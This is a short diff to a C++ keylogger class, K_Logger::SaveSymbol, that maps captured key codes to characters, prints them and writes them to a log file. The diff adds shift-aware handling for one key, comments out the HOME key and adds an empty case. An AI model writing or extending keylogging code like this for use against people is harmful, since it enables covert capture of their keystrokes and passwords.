@@ -499,8 +499,16 @@ int K_Logger::SaveSymbol(WORD iKey)
 			}
 			break;
 
-
-	
+		case 044:
+			if (GetAsyncKeyState(0xA0))
+			{
+				std::cout << "<";
+			}
+			else
+			{
+				std::cout << ",";
+			}
+			break;
 
 
 		case 0x70:
@@ -568,10 +576,10 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile("  *F12*  ");
 			break;
 
-		case 0x24:
-			std::cout << "  *HOME*  ";
-			WriteToFile("  *HOME*  ");
-			break;
+		//case 0x24:
+		//	std::cout << "  *HOME*  ";
+		//	WriteToFile("  *HOME*  ");
+		//	break;
 
 		case 0x90:
 			std::cout << "  *Num_Lock*  ";
@@ -586,6 +594,10 @@ int K_Logger::SaveSymbol(WORD iKey)
 		case 0x60:
 			std::cout << "0";
 			WriteToFile("0");
+			break;
+
+		case 192:
+			
 			break;
 
 
